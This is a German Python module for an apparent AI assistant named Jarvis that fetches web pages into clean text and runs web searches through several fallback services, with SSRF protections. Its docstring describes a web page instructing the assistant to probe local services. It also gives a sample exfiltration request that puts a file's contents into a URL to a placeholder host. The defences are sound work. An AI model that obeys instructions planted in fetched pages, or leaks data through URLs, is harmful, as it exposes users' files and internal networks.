#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""Netz - Webseiten lesen und im Web suchen, ohne Zusatzprogramme.

Bisher konnte Jarvis Seiten nur über Playwright samt eigenem Chromium lesen
und nur mit einem Brave-Schlüssel suchen. Fehlt beides - und auf einem
normalen Mac fehlt es -, konnte er gar nichts lesen. Dieses Modul braucht nur
Python:

* **Seite lesen**: Die Seite wird geholt und in Klartext zerlegt - Titel,
  Überschriften, Absätze, dazu Links, Mailadressen und Telefonnummern.
  Skripte, Menüs und Fußzeilen fliegen raus.
* **Suchen**: der Reihe nach über den Such-Dienst (falls eingerichtet), die
  Google-Suche des Gemini-Schlüssels (falls Kontingent da ist), DuckDuckGo und
  Mojeek. Der erste Weg, der Ergebnisse liefert, gewinnt.

**Sicherheit.** Gelesen wird nur http und https, nie eine Adresse im eigenen
Netz (127.0.0.1, 192.168.x.x ...). Sonst könnte eine fremde Seite Jarvis
anweisen, die eigene Schnittstelle oder den Router abzufragen. Sehr lange
Adressen werden abgelehnt: Über die Adresse ließen sich sonst Daten nach
draußen schmuggeln ("lies https://fremd.example/?d=<Inhalt einer Datei>").
"""

import html
import ipaddress
import json
import re
import socket
import urllib.error
import urllib.parse
import urllib.request
from html.parser import HTMLParser

import config

BROWSER_KENNUNG = ("Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 "
                   "(KHTML, like Gecko) Version/17.0 Safari/605.1.15")
MAX_ADRESSE = 400
MAX_BYTES = 2 * 1024 * 1024
MAX_SEITENTEXT = 6000

UEBERSPRINGEN = {"script", "style", "noscript", "svg", "template", "iframe", "canvas",
                 "nav", "footer", "form", "button", "select", "option"}
BLOCK = {"p", "div", "section", "article", "main", "li", "tr", "td", "th", "br",
         "h1", "h2", "h3", "h4", "h5", "h6", "dd", "dt", "blockquote", "pre",
         "address", "figcaption", "header", "table", "ul", "ol"}

MAIL_MUSTER = re.compile(r"[A-Za-z0-9._%+-]+@[A-Za-z0-9.-]+\.[A-Za-z]{2,}")
TELEFON_MUSTER = re.compile(r"(?:\+|00)\d{2}[\d\s/().-]{6,}\d|\b0\d{2,4}[\s/-]?\d[\d\s/-]{4,}\d")


class _Zerleger(HTMLParser):
    """Zerlegt HTML in lesbaren Text, Links und Kontaktdaten."""

    def __init__(self):
        super().__init__(convert_charrefs=True)
        self.titel = ""
        self.beschreibung = ""
        self.teile = []
        self.links = []
        self.mails = set()
        self.telefone = set()
        self._tiefe_aus = 0
        self._im_titel = False
        self._link = None

    def handle_starttag(self, tag, attrs):
        werte = dict(attrs)
        if tag in UEBERSPRINGEN:
            self._tiefe_aus += 1
            return
        if tag == "title":
            self._im_titel = True
        elif tag == "meta" and (werte.get("name") or werte.get("property") or "").lower() in (
                "description", "og:description"):
            self.beschreibung = self.beschreibung or (werte.get("content") or "").strip()
        elif tag == "a":
            ziel = (werte.get("href") or "").strip()
            if ziel.lower().startswith("mailto:"):
                self.mails.add(ziel[7:].split("?")[0])
            elif ziel.lower().startswith("tel:"):
                self.telefone.add(urllib.parse.unquote(ziel[4:]).strip())
            elif ziel and not ziel.startswith(("#", "javascript:")):
                self._link = [ziel, ""]
        if tag in BLOCK:
            self.teile.append("\n")
        if tag in ("h1", "h2", "h3"):
            self.teile.append("## ")

    def handle_endtag(self, tag):
        if tag in UEBERSPRINGEN:
            self._tiefe_aus = max(0, self._tiefe_aus - 1)
            return
        if tag == "title":
            self._im_titel = False
        elif tag == "a" and self._link is not None:
            if self._link[1].strip():
                self.links.append((self._link[0], " ".join(self._link[1].split())[:80]))
            self._link = None
        if tag in BLOCK:
            self.teile.append("\n")

    def handle_data(self, daten):
        if self._im_titel:
            self.titel += daten
            return
        if self._tiefe_aus:
            return
        self.teile.append(daten)
        if self._link is not None:
            self._link[1] += daten

    def text(self) -> str:
        roh = "".join(self.teile)
        zeilen = []
        for zeile in roh.split("\n"):
            zeile = " ".join(zeile.split())
            if len(zeile) > 1 and (not zeilen or zeilen[-1] != zeile):
                zeilen.append(zeile)
        return "\n".join(zeilen)


def adresse_pruefen(adresse: str):
    """Gibt ``(adresse, fehler)`` zurück. Nur http/https, nichts im eigenen Netz."""
    roh = (adresse or "").strip()
    if not roh:
        return None, "Es fehlt die Adresse."
    if len(roh) > MAX_ADRESSE:
        return None, "Die Adresse ist ungewöhnlich lang - das öffne ich nicht."
    if not re.match(r"^[a-z][a-z0-9+.-]*://", roh, re.I):
        roh = "https://" + roh.lstrip("/")
    teile = urllib.parse.urlsplit(roh)
    if teile.scheme.lower() not in ("http", "https") or not teile.hostname:
        return None, "Ich lese nur Web-Adressen mit http oder https."
    host = teile.hostname.lower()
    # Umlaute in Pfad und Domain: so umschreiben, wie Browser es tun.
    try:
        netzort = host.encode("idna").decode("ascii")
    except UnicodeError:
        return None, "Die Adresse %s ergibt keinen Sinn." % host
    if teile.port:
        netzort += ":%d" % teile.port
    roh = urllib.parse.urlunsplit((
        teile.scheme.lower(), netzort,
        urllib.parse.quote(teile.path, safe="/%:@!$&'()*+,;=-._~"),
        urllib.parse.quote(teile.query, safe="/%:@!$&'()*+,;=-._~?"), ""))
    if host in ("localhost",) or host.endswith((".local", ".localhost", ".internal")):
        return None, "Adressen im eigenen Netz lese ich nicht."
    try:
        for eintrag in socket.getaddrinfo(host, None):
            ip = ipaddress.ip_address(eintrag[4][0])
            if (ip.is_private or ip.is_loopback or ip.is_link_local or ip.is_reserved
                    or ip.is_multicast or ip.is_unspecified):
                return None, "Adressen im eigenen Netz lese ich nicht."
    except (socket.gaierror, ValueError, OSError):
        return None, "Die Adresse %s gibt es nicht (oder kein Internet)." % host
    return roh, ""


class _GepruefteWeiterleitung(urllib.request.HTTPRedirectHandler):
    """Prüft jedes Weiterleitungsziel - sonst lenkt eine Seite auf 127.0.0.1 um."""

    def redirect_request(self, anfrage, datei, code, meldung, koepfe, neue_adresse):
        _, fehler = adresse_pruefen(neue_adresse)
        if fehler:
            raise urllib.error.URLError("Weiterleitung abgelehnt: %s" % fehler)
        return super().redirect_request(anfrage, datei, code, meldung, koepfe, neue_adresse)


_OEFFNER = urllib.request.build_opener(_GepruefteWeiterleitung)


def _holen(adresse: str, timeout: int = 20) -> dict:
    anfrage = urllib.request.Request(adresse, headers={
        "User-Agent": BROWSER_KENNUNG, "Accept-Language": "de-AT,de;q=0.9,en;q=0.6",
        "Accept": "text/html,application/xhtml+xml,text/plain;q=0.9,*/*;q=0.5"})
    try:
        with _OEFFNER.open(anfrage, timeout=timeout) as antwort:
            typ = antwort.headers.get("Content-Type", "")
            roh = antwort.read(MAX_BYTES)
            ziel = antwort.geturl()
    except urllib.error.HTTPError as fehler:
        return {"ok": False, "code": fehler.code,
                "fehler": "Die Seite antwortet mit Fehler %d%s." % (
                    fehler.code, " - sie lässt automatische Besucher nicht herein"
                    if fehler.code in (401, 403, 429) else "")}
    except (urllib.error.URLError, OSError, ValueError) as fehler:
        return {"ok": False, "code": 0, "fehler": "Die Seite ist nicht erreichbar: %s" % fehler}
    zeichensatz = "utf-8"
    treffer = re.search(r"charset=([\w-]+)", typ, re.I) or \
        re.search(rb'<meta[^>]+charset=["\']?([\w-]+)', roh[:4000], re.I)
    if treffer:
        gefunden = treffer.group(1)
        zeichensatz = gefunden.decode("ascii", "ignore") if isinstance(gefunden, bytes) \
            else gefunden
    try:
        text = roh.decode(zeichensatz, errors="replace")
    except LookupError:
        text = roh.decode("utf-8", errors="replace")
    return {"ok": True, "typ": typ.lower(), "inhalt": text, "adresse": ziel}


def seite_zerlegen(quelltext: str, basis: str = "") -> dict:
    """Macht aus HTML lesbaren Text samt Links und Kontaktdaten."""
    zerleger = _Zerleger()
    try:
        zerleger.feed(quelltext)
        zerleger.close()
    except Exception:
        pass
    text = zerleger.text()
    mails = set(zerleger.mails) | set(MAIL_MUSTER.findall(text))
    mails = sorted(m for m in mails if not m.lower().endswith((".png", ".jpg", ".gif",
                                                                ".webp", ".svg")))
    telefone = set(zerleger.telefone)
    for treffer in TELEFON_MUSTER.findall(text):
        if 8 <= len(re.sub(r"\D", "", treffer)) <= 15:
            telefone.add(" ".join(treffer.split()))
    links, gesehen = [], set()
    for ziel, beschriftung in zerleger.links:
        absolut = urllib.parse.urljoin(basis, ziel) if basis else ziel
        if absolut.startswith("http") and absolut not in gesehen:
            gesehen.add(absolut)
            links.append({"text": beschriftung, "adresse": absolut})
    return {"titel": " ".join(zerleger.titel.split()), "beschreibung": zerleger.beschreibung,
            "text": text, "links": links, "mails": mails[:10], "telefone": sorted(telefone)[:10]}


def webseite_lesen(adresse: str, frage: str = "") -> dict:
    """Liest eine Webseite und gibt ihren Inhalt als Text zurück."""
    adresse, fehler = adresse_pruefen(adresse)
    if fehler:
        return {"ok": False, "fehler": fehler}
    geholt = _holen(adresse)
    if not geholt["ok"]:
        return {"ok": False, "fehler": geholt["fehler"]}
    if "pdf" in geholt["typ"]:
        return {"ok": False, "fehler": "Das ist ein PDF. PDFs aus dem Netz lese ich noch nicht."}
    if "html" in geholt["typ"] or "<html" in geholt["inhalt"][:2000].lower():
        teile = seite_zerlegen(geholt["inhalt"], geholt["adresse"])
    else:
        teile = {"titel": "", "beschreibung": "", "text": geholt["inhalt"], "links": [],
                 "mails": sorted(set(MAIL_MUSTER.findall(geholt["inhalt"])))[:10],
                 "telefone": []}
    text = teile["text"]
    frage = (frage or "").strip().lower()
    if frage and len(text) > MAX_SEITENTEXT:
        # Bei langen Seiten zuerst die Absätze, in denen die Frage vorkommt.
        woerter = [w for w in re.findall(r"\w{4,}", frage)]
        absaetze = text.split("\n")
        passend = [a for a in absaetze if any(w in a.lower() for w in woerter)]
        text = "\n".join(passend[:40]) + "\n---\n" + text
    gekuerzt = len(text) > MAX_SEITENTEXT
    text = text[:MAX_SEITENTEXT]
    if not text.strip() and not teile["beschreibung"]:
        return {"ok": False, "fehler": "Die Seite liefert keinen lesbaren Text - sie baut "
                                       "sich vermutlich erst im Browser zusammen."}
    return {"ok": True, "adresse": geholt["adresse"], "titel": teile["titel"],
            "beschreibung": teile["beschreibung"][:300], "inhalt": text,
            "gekuerzt": gekuerzt, "mails": teile["mails"], "telefone": teile["telefone"],
            "links": teile["links"][:25],
            "text": "Seite gelesen: %s%s" % (teile["titel"] or geholt["adresse"],
                                             " (gekürzt)" if gekuerzt else "")}


# -- Suche ---------------------------------------------------------------------

def _ddg_zerlegen(quelltext: str) -> list:
    """Treffer aus der HTML-Ansicht von DuckDuckGo."""
    treffer = []
    for block in re.findall(r'<div class="result[^"]*results_links.*?</div>\s*</div>',
                            quelltext, re.S)[:12] or [quelltext]:
        for ziel, titel in re.findall(r'class="result__a"[^>]*href="([^"]+)"[^>]*>(.*?)</a>',
                                      block, re.S):
            auszug = re.search(r'class="result__snippet"[^>]*>(.*?)</a>', block, re.S)
            if "uddg=" in ziel:
                ziel = urllib.parse.unquote(re.search(r"uddg=([^&]+)", ziel).group(1))
            treffer.append({"titel": _ohne_tags(titel), "adresse": html.unescape(ziel),
                            "auszug": _ohne_tags(auszug.group(1)) if auszug else ""})
    eindeutig, gesehen = [], set()
    for eintrag in treffer:
        if eintrag["adresse"] not in gesehen and eintrag["adresse"].startswith("http"):
            gesehen.add(eintrag["adresse"])
            eindeutig.append(eintrag)
    return eindeutig


def _mojeek_zerlegen(quelltext: str) -> list:
    treffer = []
    for ziel, titel in re.findall(r'<a class="title" href="([^"]+)"[^>]*>(.*?)</a>',
                                  quelltext, re.S):
        treffer.append({"titel": _ohne_tags(titel), "adresse": html.unescape(ziel), "auszug": ""})
    auszuege = re.findall(r'<p class="s">(.*?)</p>', quelltext, re.S)
    for eintrag, auszug in zip(treffer, auszuege):
        eintrag["auszug"] = _ohne_tags(auszug)
    return treffer


def _ohne_tags(text: str) -> str:
    return " ".join(html.unescape(re.sub(r"<[^>]+>", " ", text or "")).split())


def _gemini_suche(frage: str) -> dict:
    """Google-Suche über den Gemini-Schlüssel, falls einer eingerichtet ist."""
    if "generativelanguage.googleapis.com" not in (config.FREIER_DIENST_URL or "") \
            or not config.FREIER_DIENST_SCHLUESSEL:
        return {"ok": False, "fehler": "kein Gemini-Schlüssel"}
    modell = (config.FREIER_DIENST_MODELL or "gemini-flash-lite-latest").split(",")[0].strip()
    nutzlast = {"contents": [{"parts": [{"text": frage + "\nAntworte knapp auf Deutsch, "
                                                     "mit Namen, Adressen und Nummern, "
                                                     "soweit gefunden."}]}],
                "tools": [{"google_search": {}}]}
    anfrage = urllib.request.Request(
        "https://generativelanguage.googleapis.com/v1beta/models/%s:generateContent" % modell,
        data=json.dumps(nutzlast).encode("utf-8"), method="POST",
        headers={"x-goog-api-key": config.FREIER_DIENST_SCHLUESSEL,
                 "Content-Type": "application/json", "User-Agent": "Jarvis/1.0"})
    try:
        with urllib.request.urlopen(anfrage, timeout=40) as antwort:
            daten = json.loads(antwort.read().decode("utf-8"))
    except (urllib.error.URLError, OSError, ValueError) as fehler:
        return {"ok": False, "fehler": "Google-Suche: %s" % fehler}
    if isinstance(daten, list):
        daten = daten[0] if daten else {}
    kandidat = (daten.get("candidates") or [{}])[0]
    text = "".join(t.get("text", "") for t in (kandidat.get("content") or {}).get("parts", []))
    quellen = [{"titel": (c.get("web") or {}).get("title", ""),
                "adresse": (c.get("web") or {}).get("uri", ""), "auszug": ""}
               for c in (kandidat.get("groundingMetadata") or {}).get("groundingChunks", [])]
    if not text.strip():
        return {"ok": False, "fehler": "Google-Suche ohne Ergebnis"}
    return {"ok": True, "weg": "Google (Gemini)", "zusammenfassung": text.strip(),
            "treffer": quellen[:8]}


def websuche(frage: str, anzahl: int = 6, such_mcp=None) -> dict:
    """Sucht im Web - der erste Weg, der Ergebnisse liefert, gewinnt."""
    frage = (frage or "").strip()
    if not frage:
        return {"ok": False, "fehler": "Sag mir, wonach ich suchen soll."}
    gruende = []
    if such_mcp is not None:
        ergebnis = such_mcp(frage)
        if ergebnis.get("ok"):
            return {"ok": True, "weg": "Such-Dienst", "zusammenfassung": ergebnis["text"],
                    "treffer": []}
        gruende.append("Such-Dienst: %s" % ergebnis.get("fehler", "")[:60])

    ergebnis = _gemini_suche(frage)
    if ergebnis.get("ok"):
        return ergebnis
    gruende.append(ergebnis.get("fehler", "")[:60])

    for name, adresse, zerlegen in (
            ("DuckDuckGo", "https://html.duckduckgo.com/html/?q=%s", _ddg_zerlegen),
            ("Mojeek", "https://www.mojeek.com/search?q=%s", _mojeek_zerlegen)):
        geholt = _holen(adresse % urllib.parse.quote_plus(frage), timeout=15)
        if not geholt["ok"]:
            gruende.append("%s: %s" % (name, geholt["fehler"][:50]))
            continue
        treffer = zerlegen(geholt["inhalt"])
        if treffer:
            return {"ok": True, "weg": name, "zusammenfassung": "", "treffer": treffer[:anzahl]}
        gruende.append("%s: keine Treffer (vielleicht gesperrt)" % name)
    return {"ok": False, "fehler": "Die Suche hat gerade keinen Weg gefunden. " +
                                   "; ".join(g for g in gruende if g)}


def suche_als_text(ergebnis: dict) -> str:
    """Macht aus einem Suchergebnis einen Text für das Gehirn."""
    zeilen = []
    if ergebnis.get("zusammenfassung"):
        zeilen.append(ergebnis["zusammenfassung"][:3000])
    for nummer, eintrag in enumerate(ergebnis.get("treffer") or [], 1):
        zeilen.append("%d. %s - %s%s" % (nummer, eintrag["titel"], eintrag["adresse"],
                                         ("\n   " + eintrag["auszug"][:240])
                                         if eintrag.get("auszug") else ""))
    return "\n".join(zeilen)
